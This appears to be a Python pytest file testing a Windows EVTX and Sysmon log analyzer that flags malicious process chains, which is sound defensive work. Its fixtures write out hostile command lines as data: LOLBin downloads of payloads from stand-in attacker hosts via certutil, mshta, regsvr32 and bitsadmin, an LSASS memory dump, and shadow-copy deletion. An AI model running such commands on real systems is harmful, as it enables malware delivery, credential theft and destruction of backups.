"""Unit tests for WindowsLogAnalyzer, binary EVTX parsing, and Sysmon correlation."""

import json
import struct
from datetime import datetime, timezone
from pathlib import Path

import pytest

from eft.analysis.evtx_analyzer import WindowsLogAnalyzer
from eft.models.evtx import (
    ProcessThreatClassification,
)


@pytest.fixture
def analyzer() -> WindowsLogAnalyzer:
    """Fixture providing an instance of WindowsLogAnalyzer."""
    return WindowsLogAnalyzer()


# -----------------------------------------------------------------------------
# Binary EVTX Synthesizer Helper
# -----------------------------------------------------------------------------


def build_synthetic_evtx(records: list[tuple[int, int, bytes]]) -> bytes:
    """Build a minimal valid binary EVTX file with header, chunk, and binary records.

    records: list of (record_id, filetime_int, payload_bytes)
    """
    # 1. EVTX File Header (4096 bytes)
    header = bytearray(4096)
    struct.pack_into(
        "<8sQQQIHHI",
        header,
        0,
        b"ElfFile\x00",  # Magic
        0,
        0,
        len(records) + 1,  # first chunk, last chunk, next rec id
        4096,
        1,
        1,
        4096,
    )  # header size, minor, major, header block size
    struct.pack_into("<H", header, 0x2A, 1)  # 1 chunk

    # 2. EVTX Chunk (65536 bytes)
    chunk = bytearray(65536)
    struct.pack_into(
        "<8sQQQQ",
        chunk,
        0,
        b"ElfChnk\x00",  # Magic
        1,
        len(records),  # first/last event rec num
        1,
        len(records),
    )  # first/last event rec id
    struct.pack_into("<I", chunk, 0x28, 512)  # chunk header size

    rec_offset = 512
    offset_idx = 0x80

    for rec_id, ft, payload in records:
        rec_size = 24 + len(payload)
        # Pad to 4-byte boundary
        if rec_size % 4 != 0:
            pad = 4 - (rec_size % 4)
            payload = payload + b"\x00" * pad
            rec_size = 24 + len(payload)

        # Record header: Magic (4B), Size (4B), Record ID (8B), FILETIME (8B)
        rec_hdr = struct.pack("<4sIQ8xQ", b"\x2a\x2a\x00\x00", rec_size, rec_id, ft)
        chunk[rec_offset : rec_offset + len(rec_hdr)] = rec_hdr
        chunk[rec_offset + 24 : rec_offset + rec_size] = payload

        # Record offset table entry
        if offset_idx < 0x200:
            struct.pack_into("<I", chunk, offset_idx, rec_offset)
            offset_idx += 4

        rec_offset += rec_size

    # Free space offset in chunk header
    struct.pack_into("<I", chunk, 0x30, rec_offset)

    return bytes(header + chunk)


# -----------------------------------------------------------------------------
# Tests
# -----------------------------------------------------------------------------


def test_filetime_to_datetime(analyzer: WindowsLogAnalyzer) -> None:
    """Test Windows 64-bit FILETIME conversion to UTC datetime."""
    # Test valid FILETIME: 132537600000000000 = ~2021-01-01
    dt = analyzer.filetime_to_datetime(132537600000000000)
    assert isinstance(dt, datetime)
    assert dt.year == 2020 or dt.year == 2021
    assert dt.tzinfo == timezone.utc

    # Test pre-1601 / zero value
    dt_zero = analyzer.filetime_to_datetime(0)
    assert dt_zero == datetime.fromtimestamp(0, tz=timezone.utc)


def test_parse_synthetic_binary_evtx(analyzer: WindowsLogAnalyzer) -> None:
    """Test parsing binary EVTX structure with headers, chunks, and XML record payloads."""
    xml_payload = (
        b"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
        b"<System><EventID>1</EventID><EventRecordID>101</EventRecordID><TimeCreated SystemTime='2026-03-01T12:00:00.000000Z'/></System>"
        b"<EventData>"
        b"<Data Name='ProcessGuid'>{11111111-2222-3333-4444-555555555555}</Data>"
        b"<Data Name='ProcessId'>2048</Data>"
        b"<Data Name='Image'>C:\\Windows\\System32\\cmd.exe</Data>"
        b"<Data Name='CommandLine'>cmd.exe /c echo test</Data>"
        b"<Data Name='ParentImage'>C:\\Windows\\explorer.exe</Data>"
        b"<Data Name='ParentProcessId'>1000</Data>"
        b"</EventData>"
        b"</Event>"
    )

    evtx_data = build_synthetic_evtx([(101, 133500000000000000, xml_payload)])
    report = analyzer.analyze_bytes(evtx_data, filename="synthetic_test.evtx")

    assert report.total_records_parsed >= 1
    assert report.total_sysmon_events >= 1
    assert 1 in report.events_by_id
    assert len(report.process_trees) >= 1
    assert report.process_trees[0].image == "C:\\Windows\\System32\\cmd.exe"
    assert report.verdict == "BENIGN"


def test_sysmon_office_macro_spawning_powershell(analyzer: WindowsLogAnalyzer) -> None:
    """Test detection of Microsoft Word spawning an encoded PowerShell execution (Office Macro)."""
    events = [
        {
            "EventID": 1,
            "RecordId": 1,
            "Timestamp": "2026-03-10T14:30:00Z",
            "EventData": {
                "ProcessGuid": "{AAAA-1111}",
                "ProcessId": "4100",
                "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "CommandLine": '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\Victim\\invoice.docm"',
                "User": "CORP\\Victim",
                "ParentProcessId": "1024",
                "ParentImage": "C:\\Windows\\explorer.exe",
            },
        },
        {
            "EventID": 1,
            "RecordId": 2,
            "Timestamp": "2026-03-10T14:30:05Z",
            "EventData": {
                "ProcessGuid": "{BBBB-2222}",
                "ProcessId": "5200",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -w hidden -enc SQBFAFgAKAA... -ep bypass",
                "User": "CORP\\Victim",
                "ParentProcessGuid": "{AAAA-1111}",
                "ParentProcessId": "4100",
                "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "Hashes": "SHA256=abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890,MD5=12345678901234567890123456789012",
            },
        },
        {
            "EventID": 3,
            "RecordId": 3,
            "Timestamp": "2026-03-10T14:30:10Z",
            "EventData": {
                "ProcessGuid": "{BBBB-2222}",
                "ProcessId": "5200",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "DestinationIp": "198.51.100.42",
                "DestinationPort": "443",
                "DestinationHostname": "c2.evil-corp.xyz",
            },
        },
        {
            "EventID": 11,
            "RecordId": 4,
            "Timestamp": "2026-03-10T14:30:15Z",
            "EventData": {
                "ProcessGuid": "{BBBB-2222}",
                "ProcessId": "5200",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "TargetFilename": "C:\\Users\\Victim\\AppData\\Local\\Temp\\beacon.exe",
            },
        },
    ]

    report = analyzer.analyze_events(events)

    assert report.total_records_parsed == 4
    assert report.verdict == "MALICIOUS"
    assert report.threat_score >= 60.0

    # Verify correlated process tree
    assert len(report.process_trees) == 1
    root = report.process_trees[0]
    assert "WINWORD.EXE" in root.image
    assert len(root.children) == 1

    child = root.children[0]
    assert "powershell.exe" in child.image
    assert len(child.network_connections) == 1
    assert child.network_connections[0].destination_ip == "198.51.100.42"
    assert len(child.created_files) == 1
    assert (
        child.created_files[0].target_filename
        == "C:\\Users\\Victim\\AppData\\Local\\Temp\\beacon.exe"
    )

    # Verify anomalies
    anomalies = [a.classification for a in report.anomalies]
    assert ProcessThreatClassification.OFFICE_MACRO_SPAWN in anomalies
    assert ProcessThreatClassification.ENCODED_COMMAND_EXECUTION in anomalies

    # Verify IOC extraction
    assert any("198.51.100.42:443" in ioc for ioc in report.extracted_iocs)
    assert any("beacon.exe" in ioc for ioc in report.extracted_iocs)
    assert any("SHA256" in ioc for ioc in report.extracted_iocs)


def test_web_shell_detection(analyzer: WindowsLogAnalyzer) -> None:
    """Test detection of IIS w3wp.exe spawning cmd.exe (Web Shell)."""
    events = [
        {
            "EventID": 1,
            "RecordId": 10,
            "Timestamp": "2026-03-12T08:00:00Z",
            "EventData": {
                "ProcessGuid": "{WEB-001}",
                "ProcessId": "1200",
                "Image": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
                "CommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap DefaultAppPool",
                "ParentProcessId": "600",
                "ParentImage": "C:\\Windows\\System32\\svchost.exe",
            },
        },
        {
            "EventID": 1,
            "RecordId": 11,
            "Timestamp": "2026-03-12T08:05:00Z",
            "EventData": {
                "ProcessGuid": "{SHELL-002}",
                "ProcessId": "3400",
                "Image": "C:\\Windows\\System32\\cmd.exe",
                "CommandLine": "cmd.exe /c whoami /all",
                "ParentProcessGuid": "{WEB-001}",
                "ParentProcessId": "1200",
                "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
            },
        },
    ]

    report = analyzer.analyze_events(events)

    assert report.verdict == "MALICIOUS"
    assert any(
        a.classification == ProcessThreatClassification.WEB_SHELL_SPAWN for a in report.anomalies
    )
    assert any("w3wp.exe" in a.detection_reason for a in report.anomalies)


def test_lolbas_certutil_and_mshta(analyzer: WindowsLogAnalyzer) -> None:
    """Test detection of LOLBAS tools certutil and mshta download & execution."""
    events = [
        {
            "EventID": 1,
            "RecordId": 20,
            "Timestamp": "2026-03-15T10:00:00Z",
            "EventData": {
                "ProcessGuid": "{CERT-01}",
                "ProcessId": "7700",
                "Image": "C:\\Windows\\System32\\certutil.exe",
                "CommandLine": "certutil.exe -urlcache -split -f http://malicious.org/stage2.exe C:\\Temp\\stage2.exe",
                "ParentProcessId": "1000",
                "ParentImage": "C:\\Windows\\explorer.exe",
            },
        },
        {
            "EventID": 1,
            "RecordId": 21,
            "Timestamp": "2026-03-15T10:01:00Z",
            "EventData": {
                "ProcessGuid": "{MSHTA-02}",
                "ProcessId": "7800",
                "Image": "C:\\Windows\\System32\\mshta.exe",
                "CommandLine": 'mshta.exe vbscript:Close(Execute("GetObject(""script:http://malicious.org/payload.sct"")"))',
                "ParentProcessId": "1000",
                "ParentImage": "C:\\Windows\\explorer.exe",
            },
        },
    ]

    report = analyzer.analyze_events(events)

    assert report.verdict in ("MALICIOUS", "SUSPICIOUS")
    lolbas_anomalies = [
        a for a in report.anomalies if a.classification == ProcessThreatClassification.LOLBAS_ABUSE
    ]
    assert len(lolbas_anomalies) >= 2


def test_shadow_copy_deletion_ransomware(analyzer: WindowsLogAnalyzer) -> None:
    """Test detection of Volume Shadow Copy deletion via vssadmin."""
    events = [
        {
            "EventID": 1,
            "RecordId": 30,
            "Timestamp": "2026-03-18T18:00:00Z",
            "EventData": {
                "ProcessGuid": "{VSS-01}",
                "ProcessId": "9100",
                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                "CommandLine": "vssadmin.exe delete shadows /all /quiet",
                "ParentProcessId": "1000",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            },
        }
    ]

    report = analyzer.analyze_events(events)

    assert report.verdict == "MALICIOUS"
    assert any(
        "Volume Shadow Copy" in a.mitre_attack_technique
        for a in report.anomalies
        if a.mitre_attack_technique
    )


def test_credential_dumping_detection(analyzer: WindowsLogAnalyzer) -> None:
    """Test detection of LSASS memory minidump credential extraction."""
    events = [
        {
            "EventID": 1,
            "RecordId": 40,
            "Timestamp": "2026-03-20T03:00:00Z",
            "EventData": {
                "ProcessGuid": "{DUMP-01}",
                "ProcessId": "6500",
                "Image": "C:\\Windows\\System32\\rundll32.exe",
                "CommandLine": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 648 C:\\Temp\\lsass.dmp full",
                "ParentProcessId": "1000",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            },
        }
    ]

    report = analyzer.analyze_events(events)

    assert report.verdict == "MALICIOUS"
    assert any(
        a.classification == ProcessThreatClassification.CREDENTIAL_DUMPING_ATTEMPT
        for a in report.anomalies
    )


def test_benign_log_triage(analyzer: WindowsLogAnalyzer) -> None:
    """Test benign system activity producing a 0 score and BENIGN verdict."""
    events = [
        {
            "EventID": 1,
            "RecordId": 50,
            "Timestamp": "2026-03-20T10:00:00Z",
            "EventData": {
                "ProcessGuid": "{NOTE-01}",
                "ProcessId": "3300",
                "Image": "C:\\Windows\\System32\\notepad.exe",
                "CommandLine": "notepad.exe C:\\Users\\User\\notes.txt",
                "ParentProcessId": "1000",
                "ParentImage": "C:\\Windows\\explorer.exe",
            },
        },
        {
            "EventID": 7,
            "RecordId": 51,
            "Timestamp": "2026-03-20T10:00:01Z",
            "EventData": {
                "ProcessGuid": "{NOTE-01}",
                "ProcessId": "3300",
                "Image": "C:\\Windows\\System32\\notepad.exe",
                "ImageLoaded": "C:\\Windows\\System32\\kernel32.dll",
                "Signed": "true",
            },
        },
    ]

    report = analyzer.analyze_events(events)

    assert report.threat_score == 0.0
    assert report.verdict == "BENIGN"
    assert len(report.anomalies) == 0
    assert len(report.process_trees) == 1
    assert len(report.process_trees[0].loaded_images) == 1


def test_file_analyzer_wrapper(analyzer: WindowsLogAnalyzer, tmp_path: Path) -> None:
    """Test analyze_file method with on-disk JSON/XML logs and error handling."""
    log_file = tmp_path / "sysmon_log.json"
    log_file.write_text(
        json.dumps(
            [
                {
                    "EventID": 1,
                    "RecordId": 99,
                    "Timestamp": "2026-03-20T12:00:00Z",
                    "EventData": {
                        "ProcessId": 1234,
                        "Image": "C:\\Windows\\System32\\calc.exe",
                        "CommandLine": "calc.exe",
                    },
                }
            ]
        ),
        encoding="utf-8",
    )

    report = analyzer.analyze_file(log_file)
    assert report.filename == "sysmon_log.json"
    assert report.total_records_parsed == 1

    # Verify serialization
    data_dict = report.to_dict()
    assert isinstance(data_dict, dict)
    assert data_dict["verdict"] == "BENIGN"

    # Non-existent file error
    with pytest.raises(FileNotFoundError):
        analyzer.analyze_file(tmp_path / "missing_file.evtx")


def test_security_event_4688_process_creation(analyzer: WindowsLogAnalyzer) -> None:
    """Test parsing and tree construction for Windows Security Event ID 4688."""
    events = [
        {
            "EventID": 4688,
            "RecordId": 700,
            "Timestamp": "2026-03-21T09:00:00Z",
            "EventData": {
                "NewProcessId": "0x1a4",  # 420 in decimal
                "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
                "CommandLine": "cmd.exe /c whoami",
                "SubjectUserName": "Administrator",
                "ParentProcessId": "0x100",  # 256 in decimal
            },
        }
    ]

    report = analyzer.analyze_events(events)
    assert report.total_security_events == 1
    assert len(report.process_trees) == 1
    assert report.process_trees[0].process_id == 420
    assert report.process_trees[0].user == "Administrator"


def test_regsvr32_and_rundll32_anomalies(analyzer: WindowsLogAnalyzer) -> None:
    """Test detection of Regsvr32 Squiblydoo and Rundll32 inline script execution."""
    events = [
        {
            "EventID": 1,
            "RecordId": 801,
            "Timestamp": "2026-03-21T11:00:00Z",
            "EventData": {
                "ProcessId": 8100,
                "Image": "C:\\Windows\\System32\\regsvr32.exe",
                "CommandLine": "regsvr32.exe /s /u /i:http://evil.org/payload.sct scrobj.dll",
                "ParentProcessId": 1000,
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            },
        },
        {
            "EventID": 1,
            "RecordId": 802,
            "Timestamp": "2026-03-21T11:05:00Z",
            "EventData": {
                "ProcessId": 8200,
                "Image": "C:\\Windows\\System32\\rundll32.exe",
                "CommandLine": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();',
                "ParentProcessId": 1000,
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            },
        },
    ]

    report = analyzer.analyze_events(events)
    assert report.verdict == "MALICIOUS" or report.verdict == "SUSPICIOUS"
    assert any("Regsvr32" in (a.mitre_attack_technique or "") for a in report.anomalies)
    assert any("Rundll32" in (a.mitre_attack_technique or "") for a in report.anomalies)


def test_evtx_record_carving(analyzer: WindowsLogAnalyzer) -> None:
    """Test carving records directly when file header is missing or corrupted."""
    xml_str = (
        "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
        "<System><EventID>1</EventID><EventRecordID>999</EventRecordID><TimeCreated SystemTime='2026-03-21T15:00:00Z'/></System>"
        "<EventData><Data Name='Image'>C:\\Windows\\System32\\notepad.exe</Data><Data Name='ProcessId'>9999</Data></EventData>"
        "</Event>"
    ).encode("utf-8")

    rec_size = 24 + len(xml_str)
    rec_hdr = struct.pack("<4sIQ8xQ", b"\x2a\x2a\x00\x00", rec_size, 999, 133500000000000000)
    raw_corrupt_data = b"RANDOM_CORRUPT_HEADER_BYTES" + rec_hdr + xml_str

    report = analyzer.analyze_bytes(raw_corrupt_data, filename="carved.evtx")
    assert report.total_records_parsed >= 1


def test_system_service_spawn_anomaly(analyzer: WindowsLogAnalyzer) -> None:
    """Test detection of critical system service spawning an interactive shell."""
    events = [
        {
            "EventID": 1,
            "RecordId": 910,
            "Timestamp": "2026-03-21T16:00:00Z",
            "EventData": {
                "ProcessId": 5050,
                "Image": "C:\\Windows\\System32\\cmd.exe",
                "CommandLine": "cmd.exe /c calc.exe",
                "ParentProcessId": 650,
                "ParentImage": "C:\\Windows\\System32\\spoolsv.exe",
            },
        }
    ]

    report = analyzer.analyze_events(events)
    assert report.verdict == "MALICIOUS"
    assert any(
        a.classification == ProcessThreatClassification.SUSPICIOUS_SERVICE_SPAWN
        for a in report.anomalies
    )


def test_binxml_utf16le_string_extraction(analyzer: WindowsLogAnalyzer) -> None:
    """Test extracting strings and tokens from binary BinXml stream with UTF-16LE encoding."""
    # Construct binary payload containing UTF-16LE strings and tokens
    payload = bytearray(b"\x0f\x01\x00\x00")  # Template token header
    payload += "1\x00".encode("utf-16le")  # EventID 1
    payload += "C:\\Windows\\System32\\certutil.exe\x00".encode("utf-16le")
    payload += "-urlcache -split -f http://test.org/x.exe\x00".encode("utf-16le")
    payload += "192.168.1.50\x00".encode("utf-16le")

    evtx_data = build_synthetic_evtx([(1001, 133500000000000000, bytes(payload))])

    report = analyzer.analyze_bytes(evtx_data, filename="utf16_test.evtx")
    assert report.total_records_parsed >= 1
    assert (
        any("certutil.exe" in img for img in report.unique_images_executed)
        or len(report.process_trees) >= 1
    )


def test_bitsadmin_lolbas(analyzer: WindowsLogAnalyzer) -> None:
    """Test detection of bitsadmin transfer job."""
    events = [
        {
            "EventID": 1,
            "RecordId": 920,
            "Timestamp": "2026-03-21T17:00:00Z",
            "EventData": {
                "ProcessId": 6120,
                "Image": "C:\\Windows\\System32\\bitsadmin.exe",
                "CommandLine": "bitsadmin.exe /transfer myJob /download /priority normal http://evil.com/payload.exe C:\\temp\\payload.exe",
                "ParentProcessId": 1000,
                "ParentImage": "C:\\Windows\\explorer.exe",
            },
        }
    ]

    report = analyzer.analyze_events(events)
    assert any(
        a.classification == ProcessThreatClassification.LOLBAS_ABUSE for a in report.anomalies
    )
